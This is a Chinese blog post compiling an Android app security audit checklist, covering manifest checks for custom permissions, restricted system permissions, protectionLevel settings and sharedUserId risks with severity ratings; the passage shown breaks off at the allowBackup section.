<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><div id="myscoll"></div><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>App安全分析指南 | zxk1ng🍓</title><meta name="keywords" content="Android安全,安全测试,漏洞"><meta name="author" content="zxk1ng"><meta name="copyright" content="zxk1ng"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="🍅对网上一些关于移动安全测试文章的整理与归纳">
<meta property="og:type" content="article">
<meta property="og:title" content="App安全分析指南">
<meta property="og:url" content="https://zxk1ng.github.io/posts/f416437f.html">
<meta property="og:site_name" content="zxk1ng🍓">
<meta property="og:description" content="🍅对网上一些关于移动安全测试文章的整理与归纳">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://api.yimian.xyz/img?type=moe&size=1920x1080">
<meta property="article:published_time" content="2025-01-15T06:38:47.000Z">
<meta property="article:modified_time" content="2025-01-15T07:14:39.056Z">
<meta property="article:author" content="zxk1ng">
<meta property="article:tag" content="Android安全">
<meta property="article:tag" content="安全测试">
<meta property="article:tag" content="漏洞">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://api.yimian.xyz/img?type=moe&size=1920x1080"><link rel="shortcut icon" href="/"><link rel="canonical" href="https://zxk1ng.github.io/posts/f416437f"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/font-awesome/6.0.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.staticfile.org/fancyapps-ui/4.0.31/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: zxk1ng","link":"链接: ","source":"来源: zxk1ng🍓","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdnjs.cloudflare.com/ajax/libs/flickr-justified-gallery/2.1.2/fjGallery.min.js',
      css: 'https://cdnjs.cloudflare.com/ajax/libs/flickr-justified-gallery/2.1.2/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'App安全分析指南',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-01-15 15:14:39'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 6 || hour >= 18
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="https://cdn1.tianli0.top/npm/element-ui@2.15.6/packages/theme-chalk/lib/index.css"><style id="themeColor"></style><style id="rightSide"></style><style id="transPercent"></style><style id="blurNum"></style><style id="settingStyle"></style><span id="fps"></span><style id="defineBg"></style><style id="menu_shadow"></style><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="zxk1ng🍓" type="application/atom+xml">
</head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/img.png" onerror="onerror=null;src='/assets/r1.jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-home"></use></svg><span class="menu_word" style="font-size:17px"> 首页</span></a></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon--article"></use></svg><span class="menu_word" style="font-size:17px"> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-guidang1">                   </use></svg><span class="menu_word" style="font-size:17px"> 归档</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-sekuaibiaoqian">                   </use></svg><span class="menu_word" style="font-size:17px"> 标签</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-fenlei">                   </use></svg><span class="menu_word" style="font-size:17px"> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-xiangzi"></use></svg><span class="menu_word" style="font-size:17px"> 八宝箱</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/box/nav/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-zhifengche">                   </use></svg><span class="menu_word" style="font-size:17px"> 网址导航</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-shejiaoxinxi"></use></svg><span class="menu_word" style="font-size:17px"> 社交</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-liuyan">                   </use></svg><span class="menu_word" style="font-size:17px"> 留言板</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/social/link/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-lianjie">                   </use></svg><span class="menu_word" style="font-size:17px"> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-wangye"></use></svg><span class="menu_word" style="font-size:17px"> 网站</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/site/echarts/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-shujutongji1">                   </use></svg><span class="menu_word" style="font-size:17px"> 文章统计</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-maoliang"></use></svg><span class="menu_word" style="font-size:17px"> 个人</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/personal/bb/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-qunliaotian">                   </use></svg><span class="menu_word" style="font-size:17px"> 唠叨</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/personal/about/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-paperplane">                   </use></svg><span class="menu_word" style="font-size:17px"> 关于</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">zxk1ng🍓</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-home"></use></svg><span class="menu_word" style="font-size:17px"> 首页</span></a></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon--article"></use></svg><span class="menu_word" style="font-size:17px"> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-guidang1">                   </use></svg><span class="menu_word" style="font-size:17px"> 归档</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-sekuaibiaoqian">                   </use></svg><span class="menu_word" style="font-size:17px"> 标签</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-fenlei">                   </use></svg><span class="menu_word" style="font-size:17px"> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-xiangzi"></use></svg><span class="menu_word" style="font-size:17px"> 八宝箱</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/box/nav/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-zhifengche">                   </use></svg><span class="menu_word" style="font-size:17px"> 网址导航</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-shejiaoxinxi"></use></svg><span class="menu_word" style="font-size:17px"> 社交</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-liuyan">                   </use></svg><span class="menu_word" style="font-size:17px"> 留言板</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/social/link/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-lianjie">                   </use></svg><span class="menu_word" style="font-size:17px"> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-wangye"></use></svg><span class="menu_word" style="font-size:17px"> 网站</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/site/echarts/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-shujutongji1">                   </use></svg><span class="menu_word" style="font-size:17px"> 文章统计</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-maoliang"></use></svg><span class="menu_word" style="font-size:17px"> 个人</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/personal/bb/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-qunliaotian">                   </use></svg><span class="menu_word" style="font-size:17px"> 唠叨</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/personal/about/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-paperplane">                   </use></svg><span class="menu_word" style="font-size:17px"> 关于</span></a></li></ul></div></div><center id="name-container"><a id="page-name" href="javascript:scrollToTop()">PAGE_NAME</a></center><div id="nav-right"><div id="search-button"><a class="search faa-parent animated-hover" title="检索站内任何你想要的信息"><svg class="faa-tada icon" style="height:24px;width:24px;fill:currentColor;position:relative;top:6px" aria-hidden="true"><use xlink:href="#icon-valentine_-search-love-find-heart"></use></svg><span> 搜索</span></a></div><a class="meihua faa-parent animated-hover" onclick="toggleWinbox()" title="美化设置-自定义你的风格" id="meihua-button"><svg class="faa-tada icon" style="height:26px;width:26px;fill:currentColor;position:relative;top:8px" aria-hidden="true"><use xlink:href="#icon-tupian1"></use></svg></a><a class="sun_moon faa-parent animated-hover" onclick="switchNightMode()" title="浅色和深色模式转换" id="nightmode-button"><svg class="faa-tada" style="height:25px;width:25px;fill:currentColor;position:relative;top:7px" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon">       </use></svg></a><div id="toggle-menu"><a><i class="fas fa-bars fa-fw"></i></a></div></div></div></nav><div id="post-info"><h1 class="post-title">App安全分析指南</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><svg class="meta_icon post-meta-icon" style="width:30px;height:30px;position:relative;top:10px"><use xlink:href="#icon-rili"></use></svg><span class="post-meta-label">发表于 </span><time class="post-meta-date-created" datetime="2025-01-15T06:38:47.000Z" title="发表于 2025-01-15 14:38:47">2025-01-15</time><span class="post-meta-separator">|</span><svg class="meta_icon post-meta-icon" style="width:18px;height:18px;position:relative;top:5px"><use xlink:href="#icon-gengxin1"></use></svg><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-01-15T07:14:39.056Z" title="更新于 2025-01-15 15:14:39">2025-01-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><svg class="meta_icon post-meta-icon" style="width:18px;height:18px;position:relative;top:5px"><use xlink:href="#icon-biaoqian"></use></svg><a class="post-meta-categories" href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><svg class="meta_icon post-meta-icon" style="width:25px;height:25px;position:relative;top:8px"><use xlink:href="#icon-charuword"></use></svg><span class="post-meta-label">字数总计:</span><span class="word-count">3.3w</span><span class="post-meta-separator">|</span><svg class="meta_icon post-meta-icon" style="width:20px;height:20px;position:relative;top:5px"><use xlink:href="#icon-shizhong"></use></svg><span class="post-meta-label">阅读时长:</span><span>122分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="App安全分析指南"><svg class="meta_icon post-meta-icon" style="width:25px;height:25px;position:relative;top:5px"><use xlink:href="#icon-eye"></use></svg><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>APP安全分析</h1>
<h2 id="manifest文件检测">manifest文件检测</h2>
<h3 id="PermissionGroup检测">PermissionGroup检测</h3>
<p><strong>permission标签</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">permission</span> <span class="attr">android:description</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:icon</span>=<span class="string">&quot;drawable resource&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:label</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;string&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:permissionGroup</span>=<span class="string">&quot;string&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:protectionLevel</span>=<span class="string">[</span>&quot;<span class="attr">normal</span>&quot; | &quot;<span class="attr">dangerous</span>&quot; |</span></span><br><span class="line"><span class="tag">                                     &quot;<span class="attr">signature</span>&quot; | <span class="attr">...</span>] /&gt;</span></span><br><span class="line"></span><br><span class="line">//android:name ：用于在代码中（例如，在 <span class="tag">&lt;<span class="name">uses-permission</span>&gt;</span> 元素或应用组件的 permission 属性中）引用权限的名称</span><br><span class="line">    </span><br><span class="line">//android:permissionGroup : 将此权限分配给一个组。此属性的值是该组的名称，使用此应用或其他应用中的 <span class="tag">&lt;<span class="name">permission-group</span>&gt;</span> 元素声明。如果未设置此属性，则此权限不会属于某个组。</span><br></pre></td></tr></table></figure>
<p>用法：声明对于限制对此应用或其他应用的特定组件或功能的访问权限的安全权限。</p>
<p><strong>permission-group标签</strong></p>
<p>声明相关权限的逻辑分组的名称。各个权限通过 <code>&lt;permission&gt;</code> 元素的 <code>permissionGroup</code> 属性加入权限组中</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">permission-group</span> <span class="attr">android:description</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">android:icon</span>=<span class="string">&quot;drawable resource&quot;</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">android:label</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">android:name</span>=<span class="string">&quot;string&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">// android:name : 权限组的名称。这是可以分配给<span class="tag">&lt;<span class="name">permission</span>&gt;</span>元素的android:permissionGroup属性的名称</span><br></pre></td></tr></table></figure>
<p>如果在<code>&lt;permission&gt;</code>标签有permissionGroup属性，那么值应该不为空。如果permissionGroup的属性为空，会导致权限定义无效，且其他app无法使用该权限。</p>
<h3 id="AndroidManifest文件中系统权限使用检测"><strong>AndroidManifest文件中系统权限使用检测</strong></h3>
<p>当app如果使用了一些系统限制权限，如<code>android.permission.WRITE_SECURE_SETTINGS`和`android.permission.INSTALL_PACKAGES</code>，则应该是系统或者谷歌自带的app应用，否则就是一个恶意的app</p>
<p>若app使用下述权限，则app有较高的权限，要谨慎使用</p>
<ul>
<li><code>android.permission.MOUNT_FORMAT_FILESYSTEMS</code></li>
<li><code>android.permission.MOUNT_UNMOUNT_FILESYSTEMS</code></li>
<li><code>android.permission.RESTART_PACKAGES</code></li>
</ul>
<p>检测<code>&lt;uses-permission&gt;</code>中是否涉及以下权限的申请，若有其中的<strong>任何一个存在</strong>，则将该扫描项标注为提醒，并将又问题的代码段标注出来。</p>
<p><strong>对于上述权限功能补充</strong></p>
<ul>
<li>android.permission.WRITE_SECURE_SETTINGS：允许应用程序读取或者写入安全系统设置</li>
<li>android.permission.INSTALL_PACKAGES：允许程序安装应用</li>
<li>android.permission.MOUNT_FORMAT_FILESYSTEMS：允许程序格式化可移动文件系统，比如格式化清空sd卡</li>
<li>android.permission.MOUNT_UNMOUNT_FILESYSTEMS：允许程序挂载，反挂载外部文件系统</li>
<li>android.permission.RESTART_PACKAGES：允许应用程序重启其他应用程序，这个权限通常只对系统应用和特定的签名应用可用，普通应用无法使用</li>
</ul>
<h3 id="AndroidManifest危险ProtectionLevel权限检测">AndroidManifest危险ProtectionLevel权限检测</h3>
<p>由于 自定义的permission的protectionLevel属性设置不当，会导致组件数据泄露危险。最好设置权限为```signature<code>和</code>signatureOrSystem``。</p>
<p>未设置protectionLevel属性的时候默认为normal，若protectionLevel属性为normal或者是dangerous或者未设置protectionLevel，均认为不安全。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240919202911887.png" alt="image-20240919202911887"></p>
<h3 id="AndroidManifest-sharedUserId-检测">AndroidManifest sharedUserId 检测</h3>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wotakuc/archive/2013/03/27/2984423.html">Android sharedUserId研究记录 - wotakuc - 博客园 (cnblogs.com)</a></p>
<p>通过sharedUserld可以让拥有同一个user id的多个apk运行在同一个进程当中(这个sharedUserid可以随便设置)，互相访问任意资源。sharedUserid设置为<code>android.uid.system</code>，可以把app放到系统进程中，app将获得极大的权限，如果app同时有master key漏洞，容易被root</p>
<p>如果sharedUserId设置为<code>android.uid.system</code>且app有master key漏洞，则是<code>高危</code>漏洞；若没有master key漏洞，则是<code>提醒</code></p>
<p>先检测app/build.gradle中的minSdkVersion，若 &lt;= 19，则说明其运行的系统可能存在mster key漏洞（Android系统 &lt;= 4.4，即API Level &lt;= 19存在master key漏洞）。此时若sharedUserId设置为<code>android.uid.system</code>，则标注为<code>高危</code>漏洞；若minSdkVersion &gt;19 则是提醒。</p>
<p>当程序a和程序b中声明了同一个sharedUserid后，如果b想要获取a程序当中的一些资源，可以通过api  <strong>createPackageContext</strong>获取a程序的context，然后进一步获取a的资源或数据</p>
<h3 id="AndroidManifest-allowBackup检测">AndroidManifest allowBackup检测</h3>
